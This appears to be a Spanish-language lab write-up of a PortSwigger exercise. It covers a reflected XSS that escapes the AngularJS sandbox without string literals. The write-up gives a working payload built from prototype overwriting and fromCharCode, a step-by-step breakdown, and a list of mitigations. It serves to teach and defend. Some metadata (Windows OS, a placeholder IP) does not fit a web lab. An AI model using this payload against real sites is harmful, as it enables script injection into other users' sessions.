---
title: "Reflected XSS with AngularJS sandbox escape without strings"
platform: "PortSwigger"
os: "Windows"
difficulty: "Insane"
ip: "10.10.10.XXX"
slug: "reflected-xss-with-angularjs-sandbox-escape-without-strings"
author: "Z4k7"
date: "2026-04-28"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Reflected"
  - "AngularJS"
  - "NoStrings"
techniques:
  - "String.fromCharCode Bypass"
  - "AngularJS Sandbox Escape Without Strings"
  - "Prototype Pollution"
tools:
  - "BurpSuite"
flags_list:
  - label: "alert"
    value: "Ejecutado exitosamente document.domain"
summary: "Laboratorio de XSS Reflejado con AngularJS donde la función $eval no está disponible y no se pueden utilizar cadenas de texto. La solución requiere escapar del sandbox de AngularJS sin usar strings, utilizando String.fromCharCode() para construir código dinámicamente. Se usa una cadena de prototipos y manipulación de arrays para ejecutar alert(document.domain) sin escribir ninguna cadena literal.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio utiliza AngularJS de una manera inusual donde `$eval`Esta función no está disponible y no podrá utilizar ninguna cadena de texto en AngularJS.
          Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que escape del entorno aislado y ejecute el `alert`la función sin utilizar el `$eval` función.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/file-20260426193803622.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos si es posible ingresar datos en el apartado de search en dicho apartado nos permite ingresar un delimitador & en este caso validamos que el template de la web está usando angular `<script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>`
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este laboratorio es más restrictivo: la función `$eval` de AngularJS no está disponible. Esto previene escapes directos que dependan de `$eval`. Sin embargo, AngularJS tiene otros métodos para evaluar expresiones, y podemos construir strings sin escribir literales usando `String.fromCharCode()`."

  - id: "enum"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Enviamos tratamos de enviar una solicitud básica para validar la respuesta
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/file-20260426201432910.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validando el codigo fuente contamos con un script
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
          angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {
              $scope.query = {};              // 1. Se crea un objeto vacío en el scope
              var key = 'search';             // 2. Se define la variable 'key' con el valor 'search'
              $scope.query[key] = '1';        // 3. Se asigna la propiedad 'search' dentro de query: { search: '1' }
              $scope.value = $parse(key)($scope.query); // 4. Se evalúa dinámicamente la expresión 'search'
          });
          </script>
      - kind: "note"
        text: |
          Si trato de enviar un dato adicionar en la url el servidor lo toma sin problema alguno
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/file-20260426201703219.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El script toma el siguiente el indicador de la url y crea una nueva Key
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
          angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
              $scope.query = {};
              var key = 'search';
                  $scope.query[key] = '1';
                  $scope.value = $parse(key)($scope.query);
              var key = 'validacion';
                  $scope.query[key] = '';
                  $scope.value = $parse(key)($scope.query);
              });
          </script>
      - kind: "note"
        text: |
          Aplicamos el siguiente código
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

  - id: "step4_1"
    num: "04"
    title: "Explicación modular"
    content:
      - kind: "note"
        text: |
          `toString().constructor`
      - kind: "bullet"
        text: "toString() devuelve una cadena."
      - kind: "bullet"
        text: ".constructor sobre un string apunta al constructor de String, es decir, la función String"
      - kind: "note"
        text: |
          `.prototype.charAt = [].join`
      - kind: "bullet"
        text: "Aquí se está redefiniendo el método charAt del prototipo de String."
      - kind: "bullet"
        text: "En vez de devolver un carácter, ahora charAt se comporta como [].join, es decir, une elementos de un array."
      - kind: "bullet"
        text: "Esto es un truco para manipular cómo AngularJS evalúa internamente expresiones."
      - kind: "note"
        text: |
          `;[1]|orderBy: ...`
      - kind: "bullet"
        text: "[1] es un array con un solo elemento."
      - kind: "bullet"
        text: "|orderBy: es un filtro de AngularJS que ordena arrays según una expresión."
      - kind: "bullet"
        text: "El payload aprovecha este filtro para ejecutar código arbitrario."
      - kind: "note"
        text: |
          `toString().constructor.fromCharCode(...)`
      - kind: "bullet"
        text: "String.fromCharCode(...) convierte valores numéricos en caracteres ASCII."
      - kind: "bullet"
        text: "Los números (120,61,97,108,101,114,116,40,49,41) corresponden a:"
      - kind: "note"
        text: |
          - `120 → x`
          - `61 → =`
          - `97 → a`
          - `108 → l`
          - `101 → e`
          - `114 → r`
          - `116 → t`
          - `40 → (`
          - `49 → 1`
          - `41 → )`
      - kind: "bullet"
        text: "Resultado: 'x=alert(1)'."
      - kind: "note"
        text: |
          `=1` al final
          Esto fuerza la evaluación de la expresión para que AngularJS ejecute el código generado.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/file-20260426202516787.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Salta el `alert()` sin problema alguno
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/file-20260426202555005.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La técnica sin strings funciona así: 1. `toString().constructor` obtiene la clase `String` 2. `String.prototype.charAt = [].join` modifica un método de prototipo 3. Esta modificación afecta cómo AngularJS interpreta comparadores 4. `String.fromCharCode(...)` construye la cadena `'x=alert(1)'` sin escribir ningún literal 5. El filtro `orderBy` con la expresión numérica genera la cadena 6. AngularJS evalúa y ejecuta el código"

  - id: "exploit_1"
    num: "05"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El payload completo que evita strings:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)=1
      - kind: "note"
        text: |
          Desglosando cada parte:
          Parte 1: Modificar prototipo
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          toString().constructor.prototype.charAt = [].join
      - kind: "bullet"
        text: "Obtiene el constructor String"
      - kind: "bullet"
        text: "Modifica el método charAt para que actúe como [].join"
      - kind: "bullet"
        text: "Esto confunde el comparador del filtro orderBy"
      - kind: "note"
        text: |
          Parte 2: Crear array y aplicar filtro
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          [1]|orderBy:toString().constructor.fromCharCode(...)
      - kind: "bullet"
        text: "[1] es el array a ordenar"
      - kind: "bullet"
        text: "|orderBy: aplica el filtro de ordenamiento"
      - kind: "bullet"
        text: "El comparador es construido con String.fromCharCode()"
      - kind: "note"
        text: |
          Parte 3: Construir código sin strings
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)
      - kind: "bullet"
        text: "120,61,97,108,101,114,116,40 = x=alert("
      - kind: "bullet"
        text: "100,111,99,117,109,101,110,116,46,100,111,109,97,105,110 = document.domain"
      - kind: "bullet"
        text: "41 = )"
      - kind: "bullet"
        text: "Resultado: 'x=alert(document.domain)'"
      - kind: "note"
        text: |
          Parte 4: Forzar evaluación
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          =1
      - kind: "bullet"
        text: "El =1 al final fuerza que AngularJS evalúe la expresión"
      - kind: "note"
        text: |
          El resultado final es:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          var key = 'toString().constructor.prototype.charAt = [].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)=1';
          $scope.query[key] = '';
          $scope.value = $parse(key)($scope.query);
      - kind: "note"
        text: |
          AngularJS interpreta esto y ejecuta el código.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/file-20260426202516787.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Sin poder usar `$eval` y con restricción de strings, el atacante debe: 1. Manipular prototipos para cambiar el comportamiento de AngularJS 2. Usar `String.fromCharCode()` que está disponible incluso sin strings 3. Usar números ASCII en lugar de caracteres literales 4. Forzar evaluación mediante filtros que ejecutan comparadores"

  - id: "exploit"
    num: "06"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El payload final que se envía como parámetro URL:
      - kind: "code"
        lang: "BASH"
        code: |
          toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)=1
      - kind: "note"
        text: |
          (Note: `%3d` es `=` URL-encoded)
          Una vez ejecutado:
          1. AngularJS procesa el parámetro como nombre de propiedad
          2. Modifica `String.prototype.charAt`
          3. Construye la cadena `"x=alert(document.domain)"` usando ASCII codes
          4. El filtro `orderBy` evalúa la expresión
          5. AngularJS interpreta `x=alert(document.domain)` como asignación + llamada
          6. `alert(document.domain)` se ejecuta sin nunca escribir la cadena literalmente
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings/file-20260426202516787.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "alert"
        value: "Ejecutado exitosamente document.domain"

lessons:
  - 'Las restricciones de strings no previenen ejecución de código si existen métodos como `String.fromCharCode()`'
  - 'La manipulación de prototipos puede cambiar fundamentalmente cómo un framework se comporta'
  - 'El filtro `orderBy` de AngularJS evalúa el comparador en el contexto de ejecución'
  - '`$eval` no siendo accesible no significa que el código no pueda ejecutarse - hay otros vectores'
  - 'Los números ASCII pueden usarse para construir código dinámicamente sin strings literales'
  - 'Los modificadores de prototipo afectan a todo el comportamiento subsecuente del framework'
  - 'Las restricciones deben ser implementadas en múltiples capas para ser efectivas'
mitigation:
  - 'Actualizar AngularJS a versión segura o migrar a framework moderno'
  - 'Deshabilitar modificación de `Object.prototype` si es posible'
  - 'Usar `Object.freeze()` en prototipos críticos para prevenir modificaciones'
  - 'Implementar `Object.preventExtensions()` en objetos que contienen funciones'
  - 'Usar CSP con `script-src ''nonce-RANDOM''` para bloquear evaluación dinámica'
  - 'Validar entrada estrictamente - rechazar números ASCII sospechosos'
  - 'Usar `ng-strict-di` en AngularJS para forzar inyección de dependencias segura'
  - 'Considerar `Content-Security-Policy: object-src ''none''`'
  - 'Usar frameworks más seguros que no permitan manipulación de prototipos tan fácilmente'
---
